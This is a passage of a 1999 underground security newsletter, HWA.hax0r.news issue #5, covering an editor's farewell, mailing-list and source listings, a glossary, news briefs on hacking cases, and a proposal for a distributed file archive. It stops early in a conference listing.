@@ -1,0 +1,4194 @@
+    [ 28 63 29 20 31 39 39 39 20 63 72 75 63 69 70 68 75 78 20 68 77 61 ]
+  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=
+  ==========================================================================
+  =                     <=-[ HWA.hax0r.news ]-=>                           =
+  ==========================================================================
+    [=HWA'99=]                                Number 5 Volume 1 1999 Feb 99
+  ==========================================================================
+
+      "Farewell to Bikkel and demoniz issue ... we'll all miss you..." 
+                                                       - Ed
+                                                       
+   Synopsis
+   --------     
+   
+   The purpose of this newsletter is to 'digest' current events of interest
+   that affect the online underground and netizens in general. This includes
+   coverage of general security issues, hacks, exploits, underground news
+   and anything else I think is worthy of a look see.
+
+    This list is NOT meant as a replacement for, nor to compete with, the
+   likes of publications such as CuD or PHRACK or with news sites such as
+   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
+   BUGTRAQ or ISN nor could any other 'digest' of this type do so.
+
+    It *is* intended  however, to  compliment such material and provide a
+   reference to those who follow the culture by keeping tabs on as many
+   sources as possible and providing links to further info, its a labour
+   of love and will be continued for as long as I feel like it, i'm not
+   motivated by dollars or the illusion of fame, did you ever notice how
+   the most famous/infamous hackers are the ones that get caught? there's
+   a lot to be said for remaining just outside the circle... <g>
+
+
+   @HWA
+   
+   ------------------------------------------------------------------------- 
+  
+                     Welcome to HWA.hax0r.news ... #5
+                     
+   ------------------------------------------------------------------------- 
+   
+  Issue #5 early release, Feb 8th 1999                        What, me worry?
+  
+  Issue #6 will be released Feb 13th 1999 as we move towards a weekly release
+  schedule ...
+  
+
+  _____/[ INDEX ]\___________________________________________________________         
+
+    Key     Content
+  ---------------------------------------------------------------------------    
+  
+    0.0  .. COPYRIGHTS 
+    0.1  .. CONTACT INFORMATION & SNAIL MAIL DROP ETC
+    0.2  .. SOURCES        
+    0.3  .. THIS IS WHO WE ARE
+    0.4  .. WHAT'S IN A NAME? why `HWA.hax0r.news'?
+    0.5  .. THE HWA_FAQ V1.0 
+    
+ ----------------------------------------------------------------------------    
+    A.A  .. Bikkel is no more, demoniz quits the news scene.
+    1.0  .. Greets
+    1.1  .. Last minute stuff, rumours, newsbytes, mailbag
+    2.0  .. From the editor
+    2.1  .. POWAR? - "Knowledge may be POWER but POWAR is knowledge"
+    3.0  .. INFOSEC World
+    4.0  .. DEFCON 7
+    5.0  .. Hackertown
+    6.0  .. Yet more MSIE bugs
+    6.1  .. Not to be outdone, NETSCAPE bugs ...
+    7.0  .. The Datalynx hole
+    8.0  .. Mailzone, latest exploits and etc from Bugtraq+ traffic
+    9.0  .. Off The Hook Off The Air?
+   10.0  .. The Caligula Virus
+   11.0  .. Unphamiliar Territory, 10 yrs of hacker culture immortalized
+    H.W  .. Hacked Websites 
+    A.0  .. APPENDICES  
+    A.1  .. PHACVW linx and references 
+
+  ---------------------------------------------------------------------------
+
+     @HWA'98/99                 
+     
+     
+  A.A 100% Bikkel is no more
+      ~~~~~~~~~~~~~~~~~~~~~~     
+      
+      The End
+      update by demoniz at Feb 5 , 12:45 CET
+    
+      This will come, without doubt, as a surprise to you, 100 % Pure Bikkel
+      quits. For a long time now I published daily news for the hacker scene,
+      several times a day, seven days a week. A typical example of a hobby
+      which got out of hand. A hobby which became a fulltime job. And a job
+      which gave me a lot of recognition, but unfortunately didn't pay my bills.
+    
+      No I do not quit because there's little money coming in through this
+      site. Nor do I have financial difficulties. I quit because I want to. I want to
+      devote myself again to my other job, a freelance journalist here in the
+      Netherlands. I thought about this during my holiday and gave it some
+      more thought in the past weeks. It's a well thought-out, rational
+      decision.
+    
+      Sure I could reduce the number of updates. More time, no 'The End.' I
+      won't do it. I live by the motto: 'If you can't do it right, don't do it at all.'
+      News works in mysterious ways. It's time-independent. If there's news,
+      it has to be published immediate. Otherwise you'll behind the times. I
+      don't want that.
+    
+      It's time to move on. And that's what I'm about to do.
+    
+      Greetz to you all
+    
+      demoniz 
+      
+      Greets and thanks
+      update by demoniz at Feb 5 , 12:45 CET
+
+      It wouldn't be possible to maintain this site without the help of all
+      contributors. I'd like to thank all of you for submitting news.
+      Without you there wouldn't be any news.
+
+      There are some people who deserve some 'special' attention.
+
+      Qubik: The man behind the show.
+
+      Spikeman: Submitted on a regular base news. You rule.
+
+      Space Rogue: Editor of HNN. Several breaking stories made you the man.
+
+      Ken Williams: We all know Packet Storm Security and we all love it.
+
+      splazzatch & loser: My favorite posters on the board.
+
+      Iron-Lungs: Man, I wrote so much about you, you just have to be on this list :)
+
+      cruciphux: Editor of hwa.hax0r.news. My favorite ezine. Damn funny.
+
+      thejian: Just a cool guy who often gave me news.
+
+      (Very likely that I forgot to mention someone, forgive me :) 
+
+      
+      Goodbye
+      ~~~~~~~
+
+      Thanks for the great site demoniz, best wishes and good luck with your other
+      "real" job, and we hope to see you "around" from time to time. - Cruciphux
+      and the staff of HWA.
+      
+      @HWA       
+
+         
+  0.0  (C) COPYRIGHT, (K)OPYWRONG, COPYLEFT? V2.0
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     THE OPINIONS OF THE WRITERS DO NOT NECESSARILY REFLECT THE
+     OPINIONS OF THE PUBLISHERS AND VICE VERSA IN FACT WE DUNNO
+     WTF IS GONNA TAKE RESPONSIBILITY FOR THIS, I'M NOT DOING IT
+     (LOTS OF ME EITHER'S RESOUND IN THE BACKGROUND) SO UHM JUST
+     READ IT AND IF IT BUGS YOU WELL TFS (SEE FAQ).
+     
+     Important semi-legalese and license to redistribute:
+     
+     YOU MAY DISTRIBUTE THIS ZINE WITHOUT PERMISSION FROM MYSELF 
+     AND ARE GRANTED THE RIGHT TO QUOTE ME OR THE CONTENTS OF THE
+     ZINE SO LONG AS Cruciphux AND/OR HWA.hax0r.news ARE MENTIONED 
+     IN YOUR WRITING. LINK'S ARE NOT NECESSARY OR EXPECTED BUT ARE 
+     APPRECIATED the current link is http://welcome.to/HWA.hax0r.news
+     IT IS NOT MY INTENTION TO VIOLATE ANYONE'S COPYRIGHTS OR BREAK
+     ANY NETIQUETTE IN ANY WAY IF YOU FEEL I'VE DONE THAT PLEASE EMAIL
+     ME PRIVATELY current email cruciphux@dok.org 
+     
+     THIS DOES NOT CONSTITUTE ANY LEGAL RIGHTS, IN THIS COUNTRY ALL
+     WORKS ARE (C) AS SOON AS COMMITTED TO PAPER OR DISK, IF ORIGINAL
+     THE LAYOUT AND COMMENTARIES ARE THEREFORE (C) WHICH MEANS:
+     
+     I RETAIN ALL RIGHTS, BUT I GIVE YOU THE RIGHT TO READ, QUOTE
+     AND REDISTRIBUTE/MIRROR. - EoD
+   
+    
+     Although this file and all future issues are now copyright, some of
+    the content holds its  own copyright and these are printed and 
+    respected. News is news so i'll print any and all news but will quote 
+    sources when the source is known, if its good enough for CNN its good
+    enough for me. And i'm doing it for free on my own time so pfffft. :) 
+    
+    No monies are made or sought through the distribution of this material.
+    If you have a problem or concern email me and we'll discuss it.
+    
+    cruciphux@dok.org
+    
+    Cruciphux [C*:.]
+
+      
+     
+  0.1  CONTACT INFORMATION AND MAIL DROP
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Wahoo, we now have a mail-drop, if you are outside of the U.S.A or 
+    Canada / North America (hell even if you are inside ..) and wish to
+    send printed matter like newspaper clippings a subscription to your
+    cool foreign hacking zine or photos, small non-explosive packages
+    or sensitive information etc etc well, now you can. (w00t) please
+    no more inflatable sheep or plastic dog droppings, or fake vomit
+    thanks.
+    
+    Send all goodies to:
+    
+	    HWA NEWS
+	    P.O BOX 44118
+	    370 MAIN ST. NORTH
+	    BRAMPTON, ONTARIO
+	    CANADA
+	    L6V 4H5
+	    
+    Ideas for interesting 'stuff' to send in apart from news:
+    
+    - Photo copies of old system manual front pages (signed by you) ;-)
+    - Photos of yourself, your mom, sister, dog and or cat in a NON
+      compromising position plz I don't want pr0n. <g>
+    - Picture postcards
+    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
+      tapes with hack/security related archives, logs, irc logs etc on em.
+    - audio or video cassettes of yourself/others etc of interesting phone
+      fun or social engineering examples or transcripts thereof.
+    
+    If you still can't think of anything you're probably not that interesting
+    a person after all so don't worry about it <BeG>  
+    
+    Our current email:
+    
+    Submissions/zine gossip.....: hwa@press.usmc.net
+    Private email to editor.....: cruciphux@dok.org
+    Distribution/Website........: sas72@usa.net
+
+    @HWA
+
+           
+    
+  0.2  Sources ***
+       ~~~~~~~~~~~     
+
+     Sources can be some, all, or none of the following (by no means complete
+    nor listed in any degree of importance) Unless otherwise noted, like msgs
+    from lists or news from other sites, articles and information is compiled
+    and or sourced by Cruciphux no copyright claimed.
+
+    HiR:Hackers Information Report... http://axon.jccc.net/hir/
+    News & I/O zine ................. http://www.antionline.com/
+    News/Hacker site................. http://www.bikkel.com/~demoniz/
+    News (New site unconfirmed).......http://cnewz98.hypermart.net/
+    Back Orifice/cDc..................http://www.cultdeadcow.com/
+    News site (HNN/l0pht),............http://www.hackernews.com/
+    Help Net Security.................http://net-security.org/  
+    News,Advisories,++ ...............http://www.l0pht.com/
+    NewsTrolls (HNN)..................http://www.newstrolls.com/
+    News + Exploit archive ...........http://www.rootshell.com/beta/news.html
+    CuD ..............................http://www.soci.niu.edu/~cudigest
+    News site+........................http://www.zdnet.com/
+
+    +Various mailing lists and some newsgroups, such as ...
+
+    http://www.the-project.org/ .. IRC list/admin archives
+    http://www.anchordesk.com/  .. Jesse Berst's AnchorDesk
+    
+    alt.hackers.malicious
+    alt.hackers
+    alt.2600
+    BUGTRAQ
+    ISN security mailing list
+    ntbugtraq
+    <+others>
+
+    NEWS Agencies, News search engines etc:
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    http://www.cnn.com/SEARCH/
+    http://www.foxnews.com/search/cgi-bin/search.cgi?query=cracker&days=0&wires=0&startwire=0
+    http://www.news.com/Searching/Results/1,18,1,00.html?querystr=cracker
+    http://www.ottawacitizen.com/business/
+    http://search.yahoo.com.sg/search/news_sg?p=cracker
+    http://www.washingtonpost.com/cgi-bin/search?DB_NAME=WPlate&TOTAL_HITLIST=20&DEFAULT_OPERATOR=AND&headline=&WITHIN_FIELD_NAME=.lt.event_date&WITHIN_DAYS=0&description=cracker
+    http://www.zdnet.com/zdtv/cybercrime/
+    http://www.zdnet.com/zdtv/cybercrime/chaostheory/ (Kevin Poulsen's Column)
+
+    NOTE: See appendices for details on other links.
+    
+    Referenced news links
+    ~~~~~~~~~~~~~~~~~~~~~
+       
+    http://news.bbc.co.uk/hi/english/sci/tech/newsid_254000/254236.stm
+    http://freespeech.org/eua/ Electronic Underground Affiliation
+    http://www.l0pht.com/cyberul.html     
+    http://www.hackernews.com/archive.html?122998.html
+    http://ech0.cjb.net ech0 Security
+    http://net-security.org Net Security  
+
+    ...
+    
+    
+    Submissions/Hints/Tips/Etc
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    All submissions that are `published' are printed with the credits
+    you provide, if no response is received by a week or two it is assumed
+    that you don't care wether the article/email is to be used in an issue
+    or not and may be used at my discretion.
+    
+    Looking for:
+    
+    Good news sites that are not already listed here OR on the HNN affiliates
+    page at http://www.hackernews.com/affiliates.html
+    
+    Magazines (complete or just the articles) of breaking sekurity or hacker
+    activity in your region, this includes telephone phraud and any other
+    technological use, abuse hole or cool thingy. ;-) cut em out and send it
+    to the drop box.
+    
+    
+    - Ed
+    
+    Mailing List Subscription Info   (Far from complete)         Feb 1999
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~   ~~~~~~~~~~~~~~~~~~~         ~~~~~~~~	
+        
+    ISS Security mailing list faq : http://www.iss.net/iss/maillist.html
+    
+    
+    THE MOST READ:
+    
+    BUGTRAQ - Subscription info
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    What is Bugtraq?     
+
+    Bugtraq is a full-disclosure UNIX security mailing list, (see the info
+    file) started by Scott Chasin <chasin@crimelab.com>. To subscribe to 
+    bugtraq, send mail to listserv@netspace.org containing the message body
+    subscribe bugtraq. I've been archiving this list on the web since late 
+    1993. It is searchable with glimpse and archived on-the-fly with hypermail.
+    
+    Searchable Hypermail Index;
+         
+          http://www.eecs.nwu.edu/~jmyers/bugtraq/index.html
+    
+    
+        
+    About the Bugtraq mailing list
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    The following comes from Bugtraq's info file: 
+
+    This list is for *detailed* discussion of UNIX security holes: what they are,
+    how to exploit, and what to do to fix them. 
+
+    This list is not intended to be about cracking systems or exploiting their 
+    vulnerabilities. It is about defining, recognizing, and preventing use of 
+    security holes and risks. 
+
+    Please refrain from posting one-line messages or messages that do not contain
+    any substance that can relate to this list`s charter. 
+
+    I will allow certain informational posts regarding updates to security tools,
+    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
+    on this list. 
+
+    Please follow the below guidelines on what kind of information should be posted
+    to the Bugtraq list: 
+
+    + Information on Unix related security holes/backdoors (past and present) 
+    + Exploit programs, scripts or detailed processes about the above 
+    + Patches, workarounds, fixes 
+    + Announcements, advisories or warnings 
+    + Ideas, future plans or current works dealing with Unix security 
+    + Information material regarding vendor contacts and procedures 
+    + Individual experiences in dealing with above vendors or security organizations 
+    + Incident advisories or informational reporting 
+
+    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
+    reflector address if the response does not meet the above criteria. 
+
+    Remember: YOYOW. 
+
+    You own your own words. This means that you are responsible for the words that you post on this list and that reproduction of
+    those words without your permission in any medium outside the distribution of this list may be challenged by you, the author. 
+
+    For questions or comments, please mail me: 
+    chasin@crimelab.com (Scott Chasin) 
+
+    
+    BEST-OF-SECURITY Subscription Info.
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+           
+    
+                    _/_/_/          _/_/          _/_/_/
+                   _/    _/      _/    _/      _/
+                  _/_/_/        _/    _/        _/_/
+                 _/    _/      _/    _/            _/
+                _/_/_/          _/_/        _/_/_/
+
+                Best            Of          Security
+
+    "echo subscribe|mail best-of-security-request@suburbia.net"
+
+                                or
+
+    "echo subscribe|mail best-of-security-request-d@suburbia.net"
+
+                          (weekly digest)
+
+    REASONS FOR INCEPTION
+    ---------------------
+
+    In order to compile the average security administrator, it was found
+    that the compiler had to parse a foreboding number of exceptionally
+    noisy and semantically devoid data sets.  This typically resulted in
+    dramatically high load averages and a frightening increase in core
+    entropy.
+
+    Further, the number, names and locations of required datum seem to
+    change on an almost daily basis; requiring tedious version control
+    on the part of the mental maintainer.
+
+
+   OVERVIEW
+   ---------
+
+    Best-of-Security is at presently moderated randomly based on a
+    cryptographically secure RNG. Bizarre? Sound strange given our
+    stated purpose of massive entropy reduction? Because best often
+    equates with "vital" and the moderator doesn't have an MDA habit it
+    is important that material sent to this list be delivered to its
+    subscribers' in as minimal period of time as is (in)humanly
+    possible. [ Actually, that isn't the only reason; following the
+    Prodigy liability verdict, content-active moderators were found to
+    have the legal burdens of regular publishers. BOS gets some dubious
+    people posting very interesting things from undisclosed sources.
+    -Mod ]
+
+    If you find information from *any* source (including other
+    mailinglists, newsgroups, conference notes, papers, etc) that fits
+    into one of the acceptable categories described at the end of this
+    document then you should *immediately* send it to
+    "best-of-security@suburbia.net". Do not try and predict whether or
+    not someone else will send the item in question to the list in the
+    immediate future. Unless your on a time-delayed mail vector such as
+    polled uucp or the item has already appeared on best-of-security,
+    mail the info to the list!  Even if it is a widely deployed piece of
+    information such as a CERT advisory the proceeding argument still
+    applies. If the information hasn't appeared on this list yet, then
+    SEND IT.  It is far better to run the risk of minor duplication in
+    exchange for having the information out where it is needed than act
+    conservatively about occasional doubling up on content.
+
+    We do, of course take original posts. In the famous last words of
+    Marylin Munroe, CORE Digest and Joachim Kroll: "meat, we want meat".
+
+    Consult the below lists for what we will and will not accept. 
+
+    WILL WILL WILL WILL                             WONT WONT WONT WONT
+    DO   DO   DO   DO                               DONT DONT DONT DONT
+    -------------------                             -------------------
+    8lgm, cert, ciac, dod and other                 Any flames.
+    non-vendor advisories.                          Any questions.
+    Vendor advisories of security                   Any rumors.
+    weaknesses in own or other products.            Sigs with >2 lines of
+    Vendor new security-product line                commercial information.
+    release or MAJOR upgrade.                       Minor upgrade information.
+    Fully disclosed security weaknesses.            "there is a hole in X"
+    Exploitation details.                           Any advertising.
+    Exploitation code.                              Subscription, unsubscription or
+    Patch code.                                     mailing list queries.
+    Patch announcements.                            Any requests.
+    Hard to obtain or otherwise occulted            Vague or incomprehensible
+    source code or uuencoded executables.           statements of dysfuctional
+    Conference announcements.                       persons.
+    Security tools.                                 Opinionated rantings such as
+    Blond jokes.                                    those on the ethics of full
+    NEW or hard to obtain security                  disclosure or computer hackers.
+    documents (ascii), or pointers to               Quotes from the Uliad.
+    the location of such documents/papers.          Old or otherwise well known
+    Announcements of new security archives          information or pointers to
+    or mailinglists.                                that information.
+    Human language translations of the above.       Messages under 700 bytes.
+    
+    SUBSCRIBING
+    -----------
+    
+    Send mail to: 
+    
+            best-of-security-request@suburbia.net
+    or
+            best-of-security-request-d@suburbia.net (digest)
+    
+    with the subject or body of:
+    
+            subscribe
+    
+    UN-SUBSCRIBING
+    -------------
+    
+    Send mail to:
+    
+            best-of-security-request@suburbia.net
+    or
+            best-of-security-request-d@suburbia.net (digest)
+    
+    with the subject or body:
+    
+            unsubscribe
+    
+    POSTING
+    -------
+    
+    To send a message to the list, address it to:
+    
+            best-of-security@suburbia.net
+    
+    ARCHIVES
+    --------
+    
+    Back issues of best-of-security digest are available from:
+    
+            ftp://suburbia.net/pub/mailinglists/best-of-security
+    
+    You can also instruct the mailing list processor to automatically scan and
+    retrive messages from the archive. It understands the following commands:
+    
+            get filename ...
+            ls directory ...
+            egrep case_insensitive_regular_expression filename ...
+            maxfiles nnn
+            version
+    
+            Aliases for 'get': send, sendme, getme, gimme, retrieve, mail
+            Aliases for 'ls': dir, directory, list, show
+            Aliases for 'egrep': search, grep, fgrep, find
+    
+            Lines starting with a '#' are ignored.
+            Multiple commands per mail are allowed.
+            Setting maxfiles to zero will remove the limit (to protect you against
+            yourself no more than maxfiles files will be returned per request).
+            Egrep supports most common flags.
+    
+            Examples:
+            ls latest (the latest directory containes the archived messages)
+            get latest/12
+            egrep some.word latest/*
+    
+    TECHNICAL
+    ---------
+    
+    The list processor software is based on the excellent Procmail/Smartlist
+    by Stephen R. van den Berg  with
+    some minor extensions by Julian Assange .
+    
+  --
+  "I mean, after all;  you have to consider we're only made out of dust.  That's
+   admittedly not  much  to  go  on  and  we  shouldn't  forget  that.  But even
+   considering, I mean it's sort of a bad beginning, we're not doing too bad. So
+   I personally have faith that even in this lousy situation we're faced with we
+   can make it. You get me?" - Leo Burlero/PKD
+  +---------------------+--------------------+----------------------------------+
+  |Julian Assange RSO   | PO Box 2031 BARKER | Secret Analytic Guy Union        |
+  |proff@suburbia.net   | VIC 3122 AUSTRALIA | finger for PGP key hash ID =     |
+  |proff@gnu.ai.mit.edu | FAX +61-3-98199066 | 0619737CCC143F6DEA73E27378933690 |
+  +---------------------+--------------------+----------------------------------+
+    
+
+
+    @HWA
+    
+     
+  0.3  THIS IS WHO WE ARE 
+       ~~~~~~~~~~~~~~~~~~
+      
+      Legacy staff
+      ~~~~~~~~~~~~    
+      sas72@usa.net ............. currently active
+      cruciphux@dok.org.......... currently active 
+      
+      Foreign Correspondants
+      ~~~~~~~~~~~~~~~~~~~~~~
+       N0Portz ..........................: Australia
+       Qubik ............................: United Kingdom
+       system error .....................: Indonesia
+       Wile (wile coyote) ...............: Japan/the East 
+   
+    :-p  
+    
+    
+    1. We do NOT work for the government in any shape or form.
+     
+    2. Unchanged since issue #1,
+        
+    
+    @HWA
+    
+    
+
+  0.4  Whats in a name? why HWA.hax0r.news??
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+      Well what does HWA stand for? never mind if you ever find out I may
+     have to get those hax0rs from 'Hackers' or the Pretorians after you.
+     
+     In case you couldn't figure it out hax0r is "new skewl" and although
+     it is laughed at, shunned, or even pidgeon holed with those 'dumb
+     leet (l33t?) dewds' <see article in issue #4> this is the state
+     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you 
+     up  and comers, i'd highly recommend you get that book. Its almost 
+     like  buying a clue. Anyway..on with the show .. - Editorial staff
+     
+
+   
+
+  0.5  HWA FAQ v1.0 Dec 31st 1998/1999 (Abridged)
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    
+    Also released in issue #3. (unchanged) check that issue for the faq
+    it won't be reprinted unless changed in a big way with the exception
+    of the following excerpt from the FAQ, included to assist first time
+    readers:
+
+    Some of the stuff related to personal useage and use in this zine are
+    listed below: Some are very useful, others attempt to deny the any possible
+    attempts at eschewing obfuscation by obsucuring their actual definitions.
+      
+    !=   - Mathematical notation "is not equal to" or "does not equal"
+           ASC(247)  "wavey equals" sign means "almost equal" to. If written
+           an =/= (equals sign with a slash thru it) also means !=, =< is Equal
+           to or less than and =>  is equal to or greater than (etc, this aint 
+           fucking grade school, cripes, don't believe I just typed all that..)      
+    AAM  - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)
+   *AOL  - A great deal of people that got ripped off for net access by a huge
+           clueless isp with sekurity that you can drive buses through, we're
+           not talking Kung-Fu being no good here, Buy-A-Kloo maybe?
+    EoC  - End of Commentary
+    EoA  - End of Article 
+    EoF  - End of file
+    EoD  - End of diatribe (AOL'ers: look it up)
+    CC   - Credit Card phraud
+    CCC  - Chaos Computer Club (Germany)
+    NFC  - Depends on context: No Further Comment or No Fucking Comment
+    NFR  - Network Flight Recorder (Do a websearch)
+    PHAC - And variations of same <coff> 
+           Phreaking, Hacking, Anarchy, Cracking, Carding (CC) Groups Virus, Warfare
+          
+          Alternates: H - hacking, hacktivist
+                      C - Cracking <software>
+                      C - Cracking <systems hacking>
+                      W - Warfare <cyberwarfare usually as in Jihad>
+                      CT - Cyber Terrorism
+    TBC - To Be Continued also 2bc (usually followed by ellipses...) :^0
+    TBA - To Be Arranged/To Be Announced also 2ba
+    TFS - Tough fucking shit.
+    
+    
+        "At least we know for sure which *century* Windows 2000 
+         (aka NT Workstation 5.0) will ship in.." 
+	                                          - Ed     
+
+
+  1.0  Greets!?!?! yeah greets! w0w huh. - Ed
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+     
+     Thanks to all in the community for their support and interest but i'd
+     like to see more reader input, help me out here, whats good, what sucks
+     etc, not that I guarantee i'll take any notice mind you, but send in 
+     your thoughts anyway.
+     
+     
+     Shouts to:
+
+       * Kevin Mitnick       * demoniz          * The l0pht crew
+       * tattooman           * Dicentra         * Pyra          
+       * Vexxation           * FProphet         * TwistedP      
+       * NeMstah             * the readers
+     
+       * all the people who sent in cool emails and support
+       * our new 'staff' members.
+     
+  
+     kewl sites:
+     
+     + http://www.freshmeat.net/
+     + http://www.slashdot.org/
+     + http://www.l0pht.com/
+     + http://www.2600.com/
+     + http://hacknews.bikkel.com/ (http://www.bikkel.com/~demoniz/)
+     + http://www.legions.org/
+     + http://www.genocide2600.com/      
+     + http://www.genocide2600.com/~tattooman/     
+     + http://www.hackernews.com/ (Went online same time we started issue 1!)          
+   
+     @HWA
+     
+
+  1.1  Last minute stuff, rumours and newsbytes
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+     +++ When was the last time you backed up your important data?
+     
+     
+     ++ Wired: Federal judge allows Sony Playstation clone software by Connectix
+        to continue shipping ...      
+        http://www.wired.com/news/news/email/explode-infobeat/politics/story/17753.html
+
+     ++ Wired: Credit Fixing fraud used the internet to scam methods involving
+        fake id and various scams to secure credit... interesting read for the social
+        engineering / fake id fans .. 
+        http://www.wired.com/news/news/email/explode-infobeat/politics/story/17701.html
+        
+     ++ Yahoo: AFA Cadet Charged With Hacking - (COLORADO SPRINGS) -- Another Air Force
+       Academy cadet is in trouble... charged with hacking into the computers of three 
+       private companies and causing more than 40-thousand dollars in damage. 21 yr-old
+       Christopher Wiest... a junior at the Academy near Colorado Springs... faces up to 
+                                                                             ~~~~~~~~~~~
+       15 and a half years in federal prison, and a discharge from the service if he is 
+       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       found guilty on court-martial charges. Air Force officials say the Wiest case is 
+       the first case of computer hacking to reach court-martial in that branch of 
+       military service. Attorneys for Wiest say the Air Force has the wrong man. Wiest
+       is from Pittsburgh, Pennsylvania. His court-martial could begin as early as next
+       month. Last week, the Air Force Academy announced it was investigating a handful
+       of cadets for mail theft. That investigation is still underway. 
+       
+       http://dailynews.yahoo.com/headlines/local/state/colorado/story.html?s=v/rs/19990203/co/index_2.html#2
+       
+     ++ HNN/WCCO Assoc.Press
+        
+      'Local Computer Hacker Hits In South University of Arkansas Believes Passwords Stolen'
+
+      ".. Police said the hacker has invaded computers in at least five states and
+      likely faces federal charges..." 
+
+      "The breach was discovered Jan. 21. The university found evidence the
+       system may have been first hacked in November...The university is plugging
+       holes in its computer system to prevent other hackers from gaining access. "
+
+      via HNN/Associated Press (c) 1999                                    
+      WCCO:  http://www.wcco.com/news/stories/news-990205-213944.html
+   
+  2.0  From the editor.
+       ~~~~~~~~~~~~~~~~
+
+     #include <stdio.h>
+     #include <stupid.h>
+     #include <backup.h>
+
+     main()
+     {
+      printf ("Read commented source!\n\n");
+      
+     /*             
+      *  We all gno that its not a matter of IF your system is going to
+      *fail but a question of WHEN. Thats what MTBF stands for, mean time
+      *between failure. All hardware fails. Wetware should know that hw 
+      *fails and compensate for it. My wetware failed to follow this rule &
+      *as a result I lost weeks of work. Lazyness? yeah. stupid fuck? you
+      *bet your ass I feel stupid. Anyway the rule is, back-up backup some
+      *more, then backup again. If a guy who's been around the block as many
+      *times as I have can be bitten on the ass it can happen to you too.
+      *Nuff'said, lecture over, I remain yours in ignorance, Cruciphux.
+      *
+      */
+      printf ("EoF.\n");
+      }
+
+
+      Issue #5! ... have at it ...
+     
+     
+      Congrats, thanks, articles, news submissions and kudos to us at the
+     main address: hwa@press.usmc.net complaints and all nastygrams and 
+     mailbombs can go to /dev/nul nukes, synfloods and papasmurfs to 
+     127.0.0.1, private mail to cruciphux@dok.org
+
+     danke.
+
+     C*:.
+
+
+     @HWA
+     
+     
+         
+  2.1 POWAR - An idea who's time has come(?) opens itself up for inspection
+      =--=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+      By HWA Staff, Feb '99
+      =-=-=-=-=-=-=-=-=-=-=-=
+      
+      P.O.W.A.R - PHACVW Online Web Archive Resource
+      
+            
+       Well at the moment it is little more than a somewhat trendy catch-
+      phrase but its an idea that AFAIK has not yet been attempted by the
+      online world, specifically the online underground world. What POWAR
+      stands for, other than an attempt at being catchy is PHAC Online Web 
+      Archive Ring (or Resource, if you prefer) what POWAR attempts to do is 
+      bring people in the underground together to be distribution nodes for a 
+      vast list of growing files (checked out Packetstorm lately?)  creating 
+      one decentralized source for info  and files by means of a distributed 
+      web approach. Consider a list of 1000 1 meg files of various import, a 
+      master list would be maintained by all POWAR net sites. Each site might
+      have 4 of the listed files, with the rest being distributed among other
+      POWAR sites. 
+      
+     Advantages:  Participants can maintain unique site characteristics but 
+                newbie  cookie-cutter sites won't be turned away so long   as 
+                they try and  maintain their perspective in the ring if  nothing 
+                else, it will give them a firm foundation point from  which to 
+                build their own online presence.
+                   
+     *         No porno banners will be allowed (* up for debate) on POWAR sites
+               the net is about dissemination of information not ramming titty
+               down kiddiez throats, I know where to go for tit, I don't need to
+               see it on every second phac site thanks...
+      
+               All the eggs aren't in one basket, if one site goes down another
+               in the queue can take its place and offer its' files
+            
+               One site doesn't control access to all the files
+                  
+               One site's speed doesn't determine accessibility to files
+                   
+               One country doesn't determine authority over the POWAR project
+               files archive.
+      
+
+  Disadvantages: All links in the chain must maintain contact with each other
+                 to determine the current health of the net and monitor downed
+                 sites or adjust for heavy traffic items to be distributed to 
+                 offset the xfer load.
+                    
+                 possible adverse affect on general net use if Geocities/Tripod 
+                 etc decide to ban 'POWAR' sites.
+                    
+                 Coordination  either manually or automatically, preferably the
+                 former since the latter begs open assaults by government or other
+                 hacking groups.
+                 
+                   
+      Its a simple enough concept, perhaps too simple, I'll leave this hanging in the
+      wind and perhaps put a poll out to see what people think of the idea on a web
+      board or two. Meanwhile send any comments, suggestions, ideas or requests to the
+      zine at hwa@press.usmc.net with 'POWAR' in the subject line. To either sign up or
+      make a comment etc, if 'joining' include your website url and how much space you
+      can dedicate to the project and what else you may be willing to do or who else
+      you can contact that may be of service to this goal and we'll take it from here.
+      
+     This is not an attempt at flouting the HWA name or myself, merely something I had
+     eating away at the back of my mind for some time now and decided to let it out and 
+     see what people thought .... so there it is.
+
+     Cruciphux@dok.org / hwa@press.usmc.net
+            
+      
+      @HWA
+                    
+  3.0 INFOSEC World
+      ~~~~~~~~~~~~~
+      
+     March 15-17, 1999
+
+     Optional Workshops March 14 & 18
+     
+     Exhibit Expo March 15 & 16
+     
+     Hilton at Disney World Village, Orlando, Florida
+     
+     
+     The All-in-One Event That Includes:
+     
+     + Open Systems Security '99 - MIS'/ISI's premier conference on protecting information in an internetworked world 
+     + The ISSA Annual Conference - The highly anticipated gathering of the leading membership organization dedicated to
+     information security 
+     + InfoSec Expo World - The expanded exhibition of leading infosec products and services, featuring more than 75 vendors
+     
+     Hot Topics and Cool Solutions
+     
+     - Secure active Web content 
+     - Single sign-on 
+     - Network packet analyzers 
+     - Creating secure extranets 
